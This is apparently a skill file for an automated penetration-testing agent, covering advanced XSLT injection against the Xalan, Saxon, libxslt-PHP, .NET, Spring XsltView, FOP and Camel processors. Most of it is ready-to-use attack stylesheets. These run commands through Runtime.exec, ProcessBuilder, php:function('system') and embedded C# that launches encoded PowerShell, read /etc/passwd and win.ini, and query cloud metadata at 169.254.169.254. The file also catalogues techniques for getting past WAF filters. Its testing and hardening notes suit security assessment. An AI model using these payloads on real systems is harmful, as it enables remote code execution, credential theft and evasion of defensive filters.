---
name: xslt-injection-advanced-deep
description: XSLT advanced depth — per-processor extension-function catalogs (Saxon/Xalan/libxslt/MSXML/.NET XslCompiledTransform), embedded scripting primitives (msxsl:script, saxon:evaluate, xalan:script), XSLT 2.0/3.0 function abuse, Spring XsltView mechanism class, Apache Camel/FOP/Jasper pipeline specifics, and WAF filter-bypass as a technique class
sibling: xslt_injection
load_when: scan_mode == "deep"
---

# XSLT Injection — Advanced + Expert Depth

This is the advanced+expert deep sibling to `xslt_injection.md`. The base owns the core primitive (attacker-controlled stylesheet reaches an extension-function-capable processor), the per-processor overview, `document()` dual-use, XSLT 1.0/2.0/3.0 differentials introduction, and the overlap/consolidation with XXE. This file owns the full established technique surface at depth: per-processor extension-function catalogues with precise function surface and namespace syntax, embedded-scripting primitives, XSLT 2.0/3.0 function-abuse full surface, Spring XsltView mechanism class, Apache FOP/Jasper/Camel pipeline specifics, blind confirmation protocol, and WAF/filter bypass as a technique class. The novel sibling `xslt_injection_novel_deep.md` owns the 2024–2026 CVE catalog.

Load this file when the goal is reasoning about which XSLT processor is in play, choosing between extension-function and `document()` primitives, bypassing a WAF that filters XSLT namespaces, or writing up a Spring XsltView finding against a specific framework version.

## Per-Processor Primitive Reach Matrix

| Processor | XSLT ver | Java reflection | PHP functions | C# scripting | document() URI | unparsed-text() | fn:env-variable | Secure default |
|---|---|---|---|---|---|---|---|---|
| **Xalan** (Java) | 1.0 | **YES** via `http://xml.apache.org/xalan/java/` | no | no | yes | no (1.0) | no (1.0) | `FEATURE_SECURE_PROCESSING=true` disables Java |
| **Saxon-HE** (Java) | 2.0/3.0/3.1 | **NO** (edition-locked) | no | no | yes | yes | yes | safe by default |
| **Saxon-PE** (Java) | 2.0/3.0/3.1 | yes if `ALLOW_EXTERNAL_FUNCTIONS=true` | no | no | yes | yes | yes | `ALLOW_EXTERNAL_FUNCTIONS=false` default |
| **Saxon-EE** (Java) | 2.0/3.0/3.1 | yes if `ALLOW_EXTERNAL_FUNCTIONS=true` | no | no | yes | yes | yes | `ALLOW_EXTERNAL_FUNCTIONS=false` default |
| **libxslt** (C) | 1.0 | no | **YES** when `registerPHPFunctions()` called (PHP binding) | no | yes | no (1.0) | no (1.0) | `XSLT_SECPREF_*` controls per-op |
| **MSXML 6** (Windows COM) | 1.0 | no | no | no (disabled in v6) | no (disabled default) | no | no | safe by default |
| **.NET XslCompiledTransform** | 1.0 | no | no | **YES** via `<msxsl:script>` when `XsltSettings.EnableScript=true` | yes if `EnableDocumentFunction=true` | no (1.0) | no (1.0) | both flags false default |
| **Spring XsltView** (framework) | inherits underlying | inherits | inherits | inherits | inherits | inherits | inherits | application-level |
| **FOP** (Apache; XSL-FO) | 1.0 | inherits underlying (Xalan or Saxon) | inherits | inherits | yes | inherits | inherits | application-level |
| **Camel Quarkus XSLT** | 1.0 (Xalan backend) | inherits Xalan | no | no | yes | no | no | CVE-2026-88789: missing default-secure |

Reads:
- **The two Java deployments that reach RCE architecturally** are Xalan-without-SECURE_PROCESSING and Saxon-PE/EE-with-ALLOW_EXTERNAL_FUNCTIONS.
- **The one PHP deployment that reaches RCE architecturally** is libxslt-PHP after any `registerPHPFunctions()` call with no allowlist.
- **The one .NET deployment that reaches RCE architecturally** is `XsltSettings.TrustedXslt` or manual `EnableScript=true`.
- **Saxon-HE, MSXML 6, and default .NET** are bounded without additional configuration — the attack surface is `document()` fetch IF the application separately enables it.
- **FOP, Camel, Spring XsltView** inherit from the underlying processor; the finding's severity depends on which XSLT engine is configured below.

## Per-Processor Extension-Function Catalogue — Depth

### Apache Xalan — Full Java Reflection Surface

**Primitive.** Xalan exposes `java.lang.*` reflection via two parallel namespace-prefix styles. Any class on the Xalan classpath is reachable; the primitive is architectural, not implementation-specific.

**Preconditions (all-of):**
1. Apache Xalan on classpath (direct or transitive — many Java frameworks pin it).
2. `TransformerFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` NOT called OR `javax.xml.xsltc.securityManager` set to `null`.
3. Attacker-controlled stylesheet source (upload, reference URL, PI delivery, or template-fragment reaching `<xsl:template>`).

Xalan exposes Java reflection via two parallel syntaxes:

**Namespace-per-class syntax:**
```xml
<xsl:stylesheet xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="runtime" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($runtime, 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```
The `getRuntime()` call returns a Java `Runtime` instance; the `exec($runtime, 'id')` call invokes `Runtime.exec` on that instance with `'id'` as the argument. The two-argument signature `rt:exec($instance, $arg)` is standard Xalan: first argument is the instance, remaining arguments are the method arguments.

**Reflection-generic syntax:**
```xml
<xsl:stylesheet xmlns:java="http://xml.apache.org/xalan/java">
  <xsl:value-of select="java:java.lang.Runtime.getRuntime().exec('id')"/>
</xsl:stylesheet>
```
A single `java:` namespace with fully-qualified class names in the function path. Equivalent reach to the per-class syntax.

**Primitive catalog via Java reflection:**
- `java.lang.Runtime.exec(cmd)` → process spawn
- `java.lang.ProcessBuilder.start()` → process spawn with controlled env
- `java.io.FileReader` / `java.io.BufferedReader` → file read
- `java.io.FileOutputStream` / `java.io.FileWriter` → file write
- `java.net.URL.openStream` / `java.net.Socket.connect` → SSRF
- `javax.script.ScriptEngineManager + getEngineByName('nashorn' or 'js')` → nested JavaScript execution (where Nashorn is on the classpath)
- `java.lang.reflect.*` → nested reflection to reach otherwise-restricted classes
- `java.lang.System.getenv()` → env dump
- `java.lang.System.exit(0)` → DoS (process kill)

**Default hardening:**
- `TransformerFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` disables Java extension functions.
- `XalanProperties.FEATURE_ALLOW_EXTENSIONS = false` is explicit disable.

**Fingerprint:** `org.apache.xalan.*` in error stacks; `xalan` namespace recognized.

**Full attack recipe — generic Xalan RCE via Runtime.exec:**
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <output>
      <xsl:variable name="runtime" select="rt:getRuntime()"/>
      <xsl:value-of select="rt:exec($runtime, 'id')"/>
    </output>
  </xsl:template>
</xsl:stylesheet>
```

**Alternate recipe — command-with-args via ProcessBuilder:**
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:pb="http://xml.apache.org/xalan/java/java.lang.ProcessBuilder"
                xmlns:arr="http://xml.apache.org/xalan/java/java.util.Arrays"
                xmlns:lst="http://xml.apache.org/xalan/java/java.util.List">
  <xsl:template match="/">
    <xsl:variable name="cmd" select="arr:asList('/bin/sh', '-c', 'id &gt; /tmp/pwn')"/>
    <xsl:variable name="builder" select="pb:new($cmd)"/>
    <xsl:value-of select="pb:start($builder)"/>
  </xsl:template>
</xsl:stylesheet>
```

**Alternate recipe — Nashorn-nested JS reach (JDK 8-14):**
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:sem="http://xml.apache.org/xalan/java/javax.script.ScriptEngineManager">
  <xsl:template match="/">
    <xsl:variable name="mgr" select="sem:new()"/>
    <xsl:variable name="engine" select="sem:getEngineByName($mgr, 'nashorn')"/>
    <xsl:value-of select="sem:eval($engine, 'java.lang.Runtime.getRuntime().exec(&#34;id&#34;)')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Confirmation signals (Xalan).**
1. **Reflected exec output in the transformed XML.** The `<xsl:value-of select="rt:exec(...)"/>` output is textual.
2. **TransformerException with Xalan-shaped stack.** `org.apache.xalan.transformer.TransformerImpl.transform(...)` in the stack.
3. **`system-property('xsl:vendor')` returns `"Apache Software Foundation (Xalan XSLTC)"`** — processor identification.
4. **OAST hit via chained `java.net.URL.openStream`** on a non-reflecting sink.
5. **File write via `java.io.FileWriter` chain** — side-effect confirmation when the output is suppressed.

**Impact.** Full host RCE as the Java process. Chains to any post-exploitation primitive in `rce.md`.

### Saxon-PE/EE — Reflexive Java Extension

Saxon's extension-function syntax differs from Xalan's. Three equivalent forms:

**Form 1 — java:namespace-per-class:**
```xml
<xsl:stylesheet xmlns:Runtime="java:java.lang.Runtime">
  <xsl:value-of select="Runtime:exec(Runtime:getRuntime(), 'id')"/>
</xsl:stylesheet>
```

**Form 2 — saxon:java-type reflection namespace:**
```xml
<xsl:stylesheet xmlns:java="http://saxon.sf.net/java-type">
  <xsl:value-of select="java:java.lang.Runtime.getRuntime().exec('id')"/>
</xsl:stylesheet>
```

**Form 3 — Saxon reflexive-class-reference:**
```xml
<xsl:stylesheet>
  <xsl:variable name="rt" select="Runtime:getRuntime()" xmlns:Runtime="java:java.lang.Runtime"/>
  <xsl:value-of select="Runtime:exec($rt, 'id')" xmlns:Runtime="java:java.lang.Runtime"/>
</xsl:stylesheet>
```

**Primitive catalog same as Xalan** — Saxon's reach is at Java reflection depth once `ALLOW_EXTERNAL_FUNCTIONS=true`.

**Full attack recipe — Saxon-PE/EE RCE:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="2.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:Runtime="java:java.lang.Runtime">
  <xsl:template match="/">
    <result>
      <xsl:value-of select="Runtime:exec(Runtime:getRuntime(), 'id')"/>
    </result>
  </xsl:template>
</xsl:stylesheet>
```

**Alternate recipe — Saxon reflexive via saxon:evaluate (XPath-side injection chain):**
```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:saxon="http://saxon.sf.net/">
  <xsl:template match="/">
    <xsl:variable name="dynamic-xpath" select="/*/payload/text()"/>
    <xsl:value-of select="saxon:evaluate($dynamic-xpath)"/>
  </xsl:template>
</xsl:stylesheet>
```
Where `/*/payload` is attacker-controlled XML (e.g., attacker's input document), the XPath `saxon:evaluate` constructs runs with full XPath 3.0 reach — including `document()` SSRF.

**Confirmation signals (Saxon).**
1. **`net.sf.saxon.*` stack trace** with error codes `SXCH0005` (configured security disallows feature), `XTDE1340`, `XTDE1360`.
2. **`system-property('xsl:vendor')` returns `"Saxonica"`**.
3. **Reflected exec output or OAST hit via `document()`**.
4. **Saxon-HE vs Saxon-PE/EE differentiation** via `system-property('xsl:product-name')` returning edition name.

**Saxon-specific extensions available even without Java reflection:**
- `saxon:evaluate(string)` — evaluates an XPath expression constructed at runtime. XPath-side injection primitive; combined with user-controlled string reaching the argument, it is a nested XPath injection.
- `saxon:parse(string)` — parses an XML string into a document node. Useful for XML construction primitives.
- `saxon:serialize(node, params)` — reverse of parse; serializes a node to XML string.
- `saxon:system-property(QName)` — reads system properties beyond standard `fn:system-property`.
- `saxon:try(expression, fallback)` — error-handling, useful for conditional execution during attacks.

**Default hardening:**
- Saxon-HE: Java extension functions **disabled; no runtime flag to enable** (edition-locked).
- Saxon-PE/EE: `net.sf.saxon.FeatureKeys.ALLOW_EXTERNAL_FUNCTIONS = false` disables Java reflection.
- Saxon's `XsltCompiler.setJustInTimeCompilation(false)` disables stylesheet-time compilation (useful for debugging but orthogonal to injection reach).

**Fingerprint:** `net.sf.saxon.*` in error stacks; `saxon` namespace recognized.

### libxslt — document() + libxslt-PHP's php:function

libxslt (C library) has a narrow extension-function surface by default. The one high-value primitive is **PHP-binding-specific**:

```xml
<xsl:stylesheet xmlns:php="http://php.net/xsl">
  <!-- php:function reaches any PHP function when registerPHPFunctions() is called -->
  <xsl:value-of select="php:function('system', 'id')"/>
  <xsl:value-of select="php:function('readfile', '/etc/passwd')"/>
  <xsl:value-of select="php:function('file_put_contents', '/tmp/pwned', 'rce')"/>
</xsl:stylesheet>
```

**Reach catalog:**
- `php:function('system', $cmd)` — shell exec
- `php:function('exec', $cmd)` / `php:function('shell_exec', $cmd)` / `php:function('passthru', $cmd)`
- `php:function('eval', $code)` — direct PHP code evaluation (preserved on PHP 8.0+ unlike assert())
- `php:function('assert', $code)` — PHP < 8.0 only (string-eval removed in PHP 8.0)
- `php:function('include', $path)` / `php:function('require', $path)` — module loading
- `php:function('file_get_contents', $path)` — file read + URL fetch
- `php:function('curl_exec', $handle)` — HTTP via cURL
- `php:function('mysql_query', $query)` — DB query execution (where mysqli is present)

**The second argument of `registerPHPFunctions($allowlist)` is the gate.** If called with no argument or null, **all** PHP functions are reachable — this is the common misuse. If called with a specific allowlist (`registerPHPFunctions(['utils_sanitize'])`), only those functions are callable.

**libxslt-native primitives (no PHP binding):**
- `document('URL')` and `document('file://...')` — same as XSLT standard.
- `exsl:node-set($rtf)` — EXSLT extension for converting result tree fragments to node-sets. Not a reach primitive, but enables intermediate XSLT constructions.

**Default hardening:**
- `xsltSetCtxtSecurityPrefs` with `XSLT_SECPREF_WRITE_FILE`, `XSLT_SECPREF_READ_FILE`, `XSLT_SECPREF_CREATE_DIRECTORY`, `XSLT_SECPREF_READ_NETWORK`.
- libxslt 1.1.37+ tightened entity resolution (see `xxe.md` for parse-side).

**Fingerprint:** `xsltApplyStylesheet`, `libxslt` in errors.

**Full attack recipe — libxslt-PHP RCE via php:function:**
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <result>
      <!-- Shell command execution via php:function('system', ...) -->
      <exec><xsl:value-of select="php:function('system', 'id')"/></exec>
      <!-- Alternate: eval() -->
      <eval><xsl:value-of select="php:function('eval', 'system(&quot;id&quot;);')"/></eval>
      <!-- File read -->
      <file><xsl:value-of select="php:function('file_get_contents', '/etc/passwd')"/></file>
      <!-- File write -->
      <write><xsl:value-of select="php:function('file_put_contents', '/tmp/pwn', 'content')"/></write>
    </result>
  </xsl:template>
</xsl:stylesheet>
```

**Alternate recipe — libxslt native file-read via document():**
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <!-- Only works where XSLT_SECPREF_READ_FILE is not set to deny -->
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Confirmation signals (libxslt / libxslt-PHP).**
1. **`php:function` namespace must be bound** — if the engine returns "unknown function," the PHP binding is not active or `registerPHPFunctions()` was not called.
2. **PHP warning output in response** — `Warning: XSLTProcessor::transformToDoc(): xmlXPathCompiledEval: evaluation failed` on malformed payload.
3. **Reflected exec output** — standard confirmation.
4. **`libxslt` version via `system-property`** — fingerprint.

### MSXML 6 (Windows)

**Extension-function surface:** very narrow — MSXML 6 disabled MSXML's extension-function API by default (vs MSXML 3 and 4 where it was enabled).

**`document()`:** disabled unless `XMLDOMDocument.resolveExternals = true`.

**`<msxsl:script>` in XSLT:** disabled; MSXML 6 does not honor the `msxsl:script` element at all. Primitives bounded to in-document XSLT.

**Fingerprint:** Windows COM errors referencing MSXML.

**Reach:** largely safe by default; attacker reach requires the application to explicitly enable `resolveExternals` or roll back to MSXML 3/4.

### .NET `XslCompiledTransform` + `<msxsl:script>`

**`<msxsl:script>` embeds C# or VB.NET code:**
```xml
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:msxsl="urn:schemas-microsoft-com:xslt"
                xmlns:user="urn:my-scripts">
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
      public string exec(string cmd) {
        return System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd).ToString();
      }
      public string readfile(string path) {
        return System.IO.File.ReadAllText(path);
      }
      public string httpget(string url) {
        return new System.Net.WebClient().DownloadString(url);
      }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:exec('whoami')"/>
    <xsl:value-of select="user:readfile('C:\\Windows\\win.ini')"/>
    <xsl:value-of select="user:httpget('http://169.254.169.254/latest/meta-data/')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Reach catalog:** full .NET standard library reachable through the embedded script. `System.Diagnostics.Process`, `System.IO.*`, `System.Net.*`, `System.Reflection.*`.

**Alternate recipe — PowerShell via `System.Diagnostics.Process`:**
```xml
<msxsl:script language="C#" implements-prefix="user">
<![CDATA[
  public string pwsh(string script) {
    var psi = new System.Diagnostics.ProcessStartInfo("powershell.exe", "-nop -enc " + script);
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    var p = System.Diagnostics.Process.Start(psi);
    return p.StandardOutput.ReadToEnd();
  }
]]>
</msxsl:script>
<xsl:value-of select="user:pwsh('cwBoAG8AdwAtAHAAcgBvAGMAZQBzAHMA')"/>  <!-- base64 'show-process' -->
```

**Alternate recipe — Reflection to bypass method-signature restrictions:**
```xml
<msxsl:script language="C#" implements-prefix="user">
<![CDATA[
  public string invoke(string typeName, string methodName, string arg) {
    var type = System.Type.GetType(typeName);
    var method = type.GetMethod(methodName);
    return method.Invoke(null, new object[] { arg }).ToString();
  }
]]>
</msxsl:script>
<xsl:value-of select="user:invoke('System.IO.File', 'ReadAllText', 'C:\\\\Windows\\\\win.ini')"/>
```

**Confirmation signals (.NET).**
1. **`System.Xml.Xsl.XsltException` with CLR stack trace** — confirms .NET-side.
2. **PowerShell/cmd output reflected** — direct confirmation.
3. **`msxsl:script` namespace honored** — confirms `EnableScript=true`.

**Default hardening:** `XsltSettings { EnableDocumentFunction = false, EnableScript = false }` — both **false by default**. An application that uses `XsltSettings.TrustedXslt` or sets `EnableScript = true` manually re-exposes.

**Fingerprint:** `System.Xml.Xsl.XsltException`; `urn:schemas-microsoft-com:xslt` namespace in stylesheets.

### Apache FOP (XSL-FO rendering)

Apache FOP is XSL-FO (not XSLT in the general sense), but it accepts XSLT 1.0 stylesheets and uses Xalan or Saxon as the underlying processor. **FOP's own XSLT reach inherits from the underlying processor** — a Xalan-backed FOP has Java reflection reach.

**FOP-specific primitives:**
- `<fo:external-graphic src="URL">` — fetches external image URIs during rendering (SSRF).
- `<fox:external-document href="URL">` — external document inclusion.
- FOP configuration `fop.xconf` with font or image URIs reachable from attacker input — path-traversal class.

**Reach bounded by FOP's own `rendererOptions`.** Default FOP configuration does not disable all URI resolution.

### Spring Framework XsltView

**Mechanism:** `org.springframework.web.servlet.view.xslt.XsltView` is a Spring MVC `View` implementation that renders XML models through XSLT. CVE-2026-47884 covers the class where:
1. Spring MVC application has `"/**"` mapping that results in view rendering.
2. The view name is not explicitly specified (auto-resolved from path).
3. Attacker-chosen path reaches `XsltView` with an attacker-controlled resource URL.

The affected range is broad — see version boundaries in `xslt_injection_novel_deep.md`. Any Spring MVC application with these preconditions is a candidate. The specific primitive is Spring-mediated SSRF-and-RCE: `XsltView` fetches the attacker-chosen stylesheet URL and processes it through the configured XSLT processor (typically Xalan or Saxon), reaching the full extension-function surface.

**Attack recipe (class-shape):**
```http
GET /admin/..any-unused-path HTTP/1.1

# Where the "/**" mapping routes to XsltView and the view name
# resolves to an attacker-controllable URL via some header or path element
```
The specifics depend on the application's routing — the primitive is "XsltView reached with attacker-controlled stylesheet source."

**Fix shape:** version bump to patched Spring Framework releases per Spring Security advisory.

### HAPI FHIR (`org.hl7.fhir.*`)

The HL7 FHIR Core Artifacts library performs XSLT transformations in multiple components. **CVE-2024-45294 (Core, CVSS 8.6), CVE-2024-52007 (HAPI FHIR, CVSS 8.6), CVE-2024-52807 (IG publisher, CVSS 8.6)** all exhibit the same mechanism: XSLT transforms performed by various components are vulnerable to XML External Entity (XXE) injection — an XML input to the transformation can contain a `DOCTYPE` with external entities that resolve during transformation. The owning-skill decision (per §8): the XXE-side mechanism in these CVEs is parse-side; `xxe.md` is the canonical owner for the XML-parse-side primitive. The XSLT-side anchor is that the TransformerFactory in these FHIR tooling paths does not set `FEATURE_SECURE_PROCESSING` by default — the XSLT configuration is the enabler.

### Apache Camel Quarkus / Apache Camel XSLT Component

**CVE-2026-88789** (Camel Quarkus — see version boundaries in novel sibling): the XSLT support extension (`camel-quarkus-support-xalan`) supplies its own Xalan-backed TransformerFactory to the `xslt` component without security options set. The Camel XSLT component is widely used for XML message transformation in ESB and integration patterns.

**Reach:** attacker who supplies the XML document being transformed can read local files or issue requests to internal network locations via an external entity declaration in that document. Dual-use with XXE at the TransformerFactory configuration layer.

## XSLT 2.0 / 3.0 Function Abuse — Full Surface

Beyond base-file's introduction, the full function surface relevant to injection:

### External Resource Load

- `fn:doc(URL)` — XSLT 2.0 standard; same as XSLT 1.0 `document()`.
- `fn:doc-available(URL)` — boolean; OAST primitive without needing response-body parse.
- `fn:unparsed-text(URL [, encoding])` — raw text fetch; works where response is not XML.
- `fn:unparsed-text-available(URL)` — boolean.
- `fn:unparsed-text-lines(URL)` — sequence of lines; useful for structured file read.
- `fn:collection(URI)` — directory-of-documents fetch; multiple HTTP requests.
- `fn:json-doc(URL)` — XPath 3.1; parses JSON from URL.

### Local System Access (XPath 3.0 standard)

- `fn:environment-variable(name)` — reads env var. Direct extraction.
- `fn:available-environment-variables()` — enumeration before extraction.
- `fn:system-property(QName)` — processor + system properties.

### Dynamic Evaluation (XSLT 3.0)

- `<xsl:evaluate select="$expression"/>` — dynamic XPath evaluation. Attacker-controlled `$expression` is an XPath-side injection primitive, chaining to all XPath functions reachable in context.
- `fn:function-lookup(QName, arity)` — reflection: look up a function by QName. Reaches engine-registered functions regardless of textual namespace prefix.
- `fn:function-name(fn)`, `fn:function-arity(fn)` — function reflection.

### Higher-Order Functions (XSLT 3.0)

- `fn:for-each(sequence, function)` — apply function to each item.
- `fn:filter(sequence, predicate)` — predicate-based filter.
- `fn:fold-left(sequence, zero, combiner)` / `fn:fold-right(...)` — reduction.
- Combined with `function-lookup`, these enable dynamic function construction and application.

### Node Construction

- `fn:parse-xml(string)` / `fn:parse-xml-fragment(string)` — parse XML string into node. Combined with user-controlled string, creates nodes with attacker-chosen namespaces (including `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` for Xalan reach via a parsed stylesheet-fragment).
- `fn:serialize(node, params)` — serialize to XML.

### String Primitives for Extraction

- `fn:substring(string, start [, length])`
- `fn:string-length(string)`
- `fn:contains(string, substring)`, `fn:starts-with(string, prefix)`, `fn:ends-with(string, suffix)`
- `fn:string-to-codepoints(string)` — codepoint sequence for Unicode extraction.
- `fn:codepoints-to-string(sequence)` — reverse.

## WAF / Filter Bypass as a Technique Class

WAFs typically filter XSLT namespaces (`xmlns:*="http://xml.apache.org/xalan/java/..."`), function names (`php:function`, `rt:exec`), or keywords (`<msxsl:script>`, `java.lang`). The class defeats each.

### Namespace variation

- **Xalan long form** `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` can be rewritten as `xmlns:java="http://xml.apache.org/xalan/java"` with reflection path in the function call. WAFs filtering the fully-qualified form miss the generic one.
- **Saxon `java:` namespace** can be `xmlns:Runtime="java:java.lang.Runtime"` or `xmlns:java="http://saxon.sf.net/java-type"` — two equivalent forms.
- **URI alternates:** some processors normalize URL case or trailing slashes — `xmlns:rt="HTTP://xml.apache.org/xalan/java/java.lang.Runtime"` may evade case-sensitive filters.

### Function-name obfuscation

- **`php:function` → `php:functionString`** — some libxslt-PHP versions accepted alternate function-call shapes.
- **`Runtime:getRuntime()` → `Runtime:getRuntime(.)`** — the explicit dot-argument may evade pattern matchers.
- **Dynamic reflection via `fn:function-lookup`** — XSLT 3.0 lets you reach functions by QName instead of textual name.

### Keyword avoidance via computed strings

```xml
<xsl:variable name="cmd" select="concat('id', '')"/>
<xsl:variable name="rtClass" select="concat('java.lang.', 'Runtime')"/>
<!-- Reaches Runtime without the literal string being present -->
```

### Entity-based namespace injection

```xml
<!DOCTYPE stylesheet [
  <!ENTITY ns "xmlns:rt='http://xml.apache.org/xalan/java/java.lang.Runtime'">
]>
<xsl:stylesheet &ns;>...</xsl:stylesheet>
```
WAFs that match namespace strings on the stylesheet root miss entity-expanded namespaces (where entity expansion is enabled by the parser).

### CDATA wrapping

```xml
<xsl:variable name="payload"><![CDATA[Runtime:exec(Runtime:getRuntime(), 'id')]]></xsl:variable>
<xsl:evaluate select="$payload"/>
```
The CDATA preserves the attack bytes past a WAF's XML parse-side filtering, but XSLT 3.0's `xsl:evaluate` interprets the string as XPath — chain to any function reachable in context.

### Processing instruction smuggling

A WAF that inspects XML element content may miss `<?xml-stylesheet?>` processing instructions. For PI-delivery sinks:
```xml
<?xml-stylesheet type="text/xsl" href="data:application/xslt+xml;base64,BASE64..."?>
<x/>
```
A `data:` URI embeds the stylesheet directly; the processor fetches "the URL" (which is a data URI) and executes.

## Composite Chains

- **Upload → xml-stylesheet PI → XSLT RCE.** Attacker uploads XML with PI pointing to attacker-hosted XSLT; renderer fetches and executes. Route: `insecure_file_uploads.md` → this file → `rce.md`.
- **Spring XsltView → RCE via /** mapping.** CVE-2026-47884 class. Route: this file → `rce.md`.
- **XSLT document() → cloud metadata.** `document('http://169.254.169.254/latest/meta-data/')` on an engine with network access. Route: this file → `cloud/aws_metadata.md`.
- **XSLT unparsed-text() → secret file.** `unparsed-text('file:///app/.env')`. Route: this file → `information_disclosure.md`.
- **Camel XSLT component → XXE → ESB config exfil.** CVE-2026-88789 class — Camel integration pipeline XML carries external entity. Route: this file + `xxe.md`.
- **GeoNetwork Saxon ALLOW_EXTERNAL_FUNCTIONS → RCE.** CVE-2026-58400 class — attacker-reached stylesheet with Java-reflection namespace. Route: this file → `rce.md`.
- **Catalog XSLT → cross-tenant data.** Metadata catalog's XSLT exposes cross-tenant records via extension-function reach. Route: this file → `information_disclosure.md`.
- **FHIR tooling TransformerFactory → XXE.** HAPI FHIR cluster — the XSLT configuration enables XXE via parse-side; both skills apply. Primary owner: `xxe.md` (parse-side mechanism); supporting pointer here (XSLT-side enabler).

## Advanced Testing Methodology

1. **Fingerprint the processor via error-shape + reflected primitives.** `fn:system-property('xsl:vendor')` reflected returns a vendor string; error-stack line numbers differentiate Saxon/Xalan/libxslt/MSXML/.NET.
2. **Confirm reflected `7*7 → 49` before firing extension functions.** The reflection confirms XSLT compile + execute; extension-function reach is a separate test.
3. **Test each processor's canonical primitive.** Xalan: `xmlns:rt + rt:getRuntime()`. Saxon: `xmlns:Runtime="java:java.lang.Runtime" + Runtime:exec(Runtime:getRuntime(), 'id')`. libxslt-PHP: `xmlns:php="http://php.net/xsl" + php:function('system', 'id')`. .NET: `<msxsl:script language="C#">`.
4. **For Spring XsltView, probe `/**` mapping.** Any Spring MVC application with a catch-all mapping is a candidate for CVE-2026-47884 class.
5. **For PI delivery, confirm the renderer honors `xml-stylesheet`.** Many renderers ignore the PI; test with an OAST URL first.
6. **For `document()` reach, use OAST before file:// or http://169.254.169.254.** OAST confirms the fetch primitive; subsequent file:// / IMDS probing is targeted.
7. **For FOP/Jasper/HAPI FHIR tooling, confirm the processor and its config.** TransformerFactory configuration is the typical finding — `FEATURE_SECURE_PROCESSING` not set.

## Advanced Validation

- **The reflected `7*7 → 49` confirms XSLT execution.** Not just reflection — computed value.
- **Processor fingerprint must match the primitive.** A Xalan Java-reflection payload fired against a libxslt-PHP backend fails cleanly; the finding would be wrong-processor-type.
- **For extension-function RCE, exec output must be observable.** Side-effect confirmation (file created, OAST hit) is the gate.
- **For `document()`-reach claims, the processor's own HTTP stack must have made the request.** Confirmed by request fingerprint — e.g., Java's `URLConnection` has a distinct User-Agent (`"Java/1.x"`) different from the attacker's test agent.
- **For `<msxsl:script>` claims, the processor must be .NET and `EnableScript = true`.** Firing against Java-side processors fails; firing against .NET with `EnableScript = false` default fails.
- **For `php:function` claims, `registerPHPFunctions()` must have been called.** The namespace alone does not grant reach; the registration call does. Grep the application source.
- **For Spring XsltView claims, the `/**` + auto-resolve preconditions must be confirmed.** Not every Spring MVC application has this configuration.

## Advanced False Positives

- **A reflected `<xsl:value-of select="7*7"/>` as `"<xsl:value-of select=\"7*7\"/>"` literally.** The engine stored or echoed; did not evaluate.
- **A 500 from any XML input.** Many frameworks 500 on malformed XML; verify by varying the payload.
- **A `php:function` payload against a non-libxslt-PHP backend.** The namespace is PHP-specific; libxslt-Python (lxml) does not accept it.
- **A Xalan Java-reflection payload against a Saxon-HE deployment.** Saxon-HE never had Java extensions; the attack fails cleanly.
- **An `xml-stylesheet` PI against a renderer that explicitly ignores it.** Many SSR engines strip PIs for safety.
- **A Spring XsltView finding against an app with no `/**` mapping.** The CVE-2026-47884 preconditions are specific.

## Deep Second-Order Attack-Graph Model

Nodes = (processor : version : extension-function-flag : document()-reach). Edges = capability transfers:
- `Xalan + FEATURE_SECURE_PROCESSING=false` → `+ Java reflection RCE edge` + `+ document() external edge`
- `Xalan + FEATURE_SECURE_PROCESSING=true` → bounded (no Java, no document())
- `Saxon-HE + any config` → bounded (XPath 3.0 standard; no Java)
- `Saxon-PE/EE + ALLOW_EXTERNAL_FUNCTIONS=true` → `+ Java reflection edge`
- `libxslt + registerPHPFunctions()` → `+ php:function direct-RCE edge`
- `libxslt + XSLT_SECPREF_READ_NETWORK unset` → `+ document() external edge`
- `.NET XslCompiledTransform + XsltSettings { EnableScript = true }` → `+ <msxsl:script> C# edge`
- `.NET + EnableDocumentFunction = true` → `+ document() edge`
- `MSXML 6 + resolveExternals = true` → `+ document() edge`
- `Spring XsltView + /** mapping + auto-resolve` → `+ attacker-stylesheet-URL edge`

The graph compresses "XSLT injection on processor X" to specific primitive set exposed by processor + configuration. The novel sibling owns the CVE instances; this file owns the structural model.

## Advanced Pro Tips

